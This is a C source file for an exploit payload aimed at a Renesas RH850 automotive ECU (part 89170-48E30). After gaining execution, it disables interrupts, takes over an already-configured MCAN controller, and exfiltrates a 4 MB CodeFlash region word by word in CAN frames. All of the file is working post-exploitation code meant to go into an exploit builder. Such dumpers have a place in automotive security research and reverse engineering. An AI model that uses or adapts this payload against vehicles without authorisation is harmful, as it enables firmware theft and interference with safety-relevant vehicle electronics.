/*
 * Read-only RH850/P1x-C extra-CodeFlash dumper for Venza 89170-48E30.
 *
 * The payload reads CodeFlash and writes only the already-configured MCAN
 * controller's message RAM/registers. It contains no FACI/FCU erase/program
 * operation and never resets the ECU.
 */

#ifndef DUMP_START
#define DUMP_START 0x00C00000u
#endif

#ifndef DUMP_LENGTH
#define DUMP_LENGTH 0x00400000u
#endif

#define DUMP_END (DUMP_START + DUMP_LENGTH)
#define DUMP_WORDS (DUMP_LENGTH / 4u)
#define PROTOCOL_VERSION 1u

#define CTRL_HELLO        0xD00D0001u
#define CTRL_RANGE_START  0xD00D0002u
#define CTRL_RANGE_LENGTH 0xD00D0003u
#define CTRL_WORD_COUNT   0xD00D0004u
#define CTRL_PROGRESS     0xD00D0010u
#define CTRL_DONE         0xD00D00FFu

#define RESPONSE_CAN_ID 0x7A9u
#define MCAN0_BASE      0xFFEF0000u
#define MCAN0_RAM       0xFFEF8000u
#define MCAN1_BASE      0xFFD31000u
#define MCAN1_RAM       0xFFD3A000u

#define MCAN_CCCR  0x018u
#define MCAN_TXBC  0x0C0u
#define MCAN_TXFQS 0x0C4u
#define MCAN_TXESC 0x0C8u
#define MCAN_TXBRP 0x0CCu
#define MCAN_TXBAR 0x0D0u
#define MCAN_TXBTO 0x0D8u

#define MCAN_CCCR_INIT       0x00000001u
#define MCAN_TXFQS_TFQF     0x00200000u
#define MCAN_STANDARD_ID_MASK 0x1FFC0000u
#define MCAN_STANDARD_ID_WORD (RESPONSE_CAN_ID << 18)
#define TX_SPIN_LIMIT       0x01000000u

struct transport {
    unsigned int base;
    unsigned int elements;
    unsigned int stride;
    unsigned int dedicated_count;
    unsigned int fifo_count;
    unsigned int buffer_index;
    unsigned int use_fifo;
};
static void select_transport(struct transport *selected);
static void send_frame(
    struct transport *transport,
    unsigned int word0,
    unsigned int word1
);

/* Keep the entry first; the builder rejects a nonzero entry offset. */
void exploit(void) {
    struct transport transport;
    unsigned int address;
    unsigned int count = 0u;

    asm("di");
    select_transport(&transport);

    send_frame(&transport, CTRL_HELLO, PROTOCOL_VERSION);
    send_frame(&transport, CTRL_RANGE_START, DUMP_START);
    send_frame(&transport, CTRL_RANGE_LENGTH, DUMP_LENGTH);
    send_frame(&transport, CTRL_WORD_COUNT, DUMP_WORDS);

    for (address = DUMP_START; address < DUMP_END; address += 4u) {
        unsigned int word = *(volatile unsigned int *)address;
        send_frame(&transport, address, word);
        count++;
        if ((count & 0x0FFFu) == 0u)
            send_frame(&transport, CTRL_PROGRESS, address + 4u);
    }

    send_frame(&transport, CTRL_DONE, count);
    while (1)
        asm("snooze");
}

static unsigned int reg_read(unsigned int address) {
    return *(volatile unsigned int *)address;
}

static void reg_write(unsigned int address, unsigned int value) {
    *(volatile unsigned int *)address = value;
}

static unsigned int tx_data_size(unsigned int code) {
    if (code == 0u)
        return 8u;
    if (code == 1u)
        return 12u;
    if (code == 2u)
        return 16u;
    if (code == 3u)
        return 20u;
    if (code == 4u)
        return 24u;
    if (code == 5u)
        return 32u;
    if (code == 6u)
        return 48u;
    return 64u;
}

/*
 * Accept only an initialized controller with a Tx element retaining the
 * diagnostic response ID. A merely configured controller is not enough.
 */
static unsigned int probe_controller(
    unsigned int base,
    unsigned int ram,
    struct transport *out
) {
    unsigned int txbc;
    unsigned int dedicated_count;
    unsigned int fifo_count;
    unsigned int total;
    unsigned int stride;
    unsigned int elements;
    unsigned int index;

    if ((reg_read(base + MCAN_CCCR) & MCAN_CCCR_INIT) != 0u)
        return 0u;

    txbc = reg_read(base + MCAN_TXBC);
    dedicated_count = (txbc >> 16) & 0x3Fu;
    fifo_count = (txbc >> 24) & 0x3Fu;
    total = dedicated_count + fifo_count;
    if (total == 0u || total > 32u)
        return 0u;

    stride = 8u + tx_data_size(reg_read(base + MCAN_TXESC) & 7u);
    elements = ram + (txbc & 0x0000FFFCu);

    out->base = base;
    out->elements = elements;
    out->stride = stride;
    out->dedicated_count = dedicated_count;
    out->fifo_count = fifo_count;
    out->buffer_index = fifo_count != 0u
        ? ((reg_read(base + MCAN_TXFQS) >> 16) & 0x1Fu)
        : dedicated_count - 1u;
    out->use_fifo = fifo_count != 0u;

    for (index = 0u; index < total; index++) {
        unsigned int header = reg_read(elements + index * stride);
        if ((header & 0x60000000u) == 0u &&
            (header & MCAN_STANDARD_ID_MASK) == MCAN_STANDARD_ID_WORD) {
            out->buffer_index = index;
            out->use_fifo = index >= dedicated_count;
            return 1u;
        }
    }
    return 0u;
}

static void select_transport(struct transport *selected) {
    struct transport candidate;
    unsigned int selected_score;
    unsigned int candidate_score;

    selected_score = probe_controller(MCAN0_BASE, MCAN0_RAM, selected);
    candidate_score = probe_controller(MCAN1_BASE, MCAN1_RAM, &candidate);
    if (candidate_score > selected_score)
        selected_score = probe_controller(MCAN1_BASE, MCAN1_RAM, selected);

    if (selected_score == 0u) {
        while (1)
            asm("snooze");
    }
}

static void transport_fault_halt(void) __attribute__((noreturn));

static void transport_fault_halt(void) {
    while (1)
        asm("snooze");
}

static void send_frame(
    struct transport *transport,
    unsigned int word0,
    unsigned int word1
) {
    unsigned int spin;
    unsigned int index;
    unsigned int mask;
    unsigned int element;

    if (transport->use_fifo != 0u) {
        for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
            unsigned int status = reg_read(transport->base + MCAN_TXFQS);
            if ((status & MCAN_TXFQS_TFQF) == 0u) {
                index = (status >> 16) & 0x1Fu;
                break;
            }
        }
        if (spin == TX_SPIN_LIMIT)
            transport_fault_halt();
    } else {
        index = transport->buffer_index;
    }

    mask = 1u << index;
    for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
        if ((reg_read(transport->base + MCAN_TXBRP) & mask) == 0u)
            break;
    }
    if (spin == TX_SPIN_LIMIT)
        transport_fault_halt();

    element = transport->elements + index * transport->stride;
    reg_write(element + 0u, MCAN_STANDARD_ID_WORD);
    reg_write(element + 4u, 8u << 16);
    reg_write(element + 8u, word0);
    reg_write(element + 12u, word1);
    asm("syncp");
    reg_write(transport->base + MCAN_TXBAR, mask);
    asm("syncp");

    for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
        if ((reg_read(transport->base + MCAN_TXBRP) & mask) == 0u &&
            (reg_read(transport->base + MCAN_TXBTO) & mask) != 0u)
            return;
    }
    transport_fault_halt();
}

